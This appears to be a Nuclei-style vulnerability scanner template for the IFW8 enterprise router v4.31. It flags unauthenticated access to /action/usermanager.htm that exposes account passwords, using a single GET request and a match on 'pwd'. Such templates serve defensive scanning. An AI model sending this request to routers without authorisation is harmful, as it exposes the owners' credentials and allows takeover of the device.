id: ifw8-enterprise-router-v4-31-password-leakage

info:
  name: IFW8 Enterprise Router v4.31 Password Leakage
  author: ProjectDiscoveryAI
  severity: medium
  description: |
    Bee Internet enterprise router V4.31 has unauthorized access to the interface, resulting in the attacker being able to get the router account password to take over the router.
  tags: disclosure, sensitive-information
  reference:
    - http://wiki.xypbk.com/

http:
  - raw:
      - |
        GET /action/usermanager.htm HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "pwd"
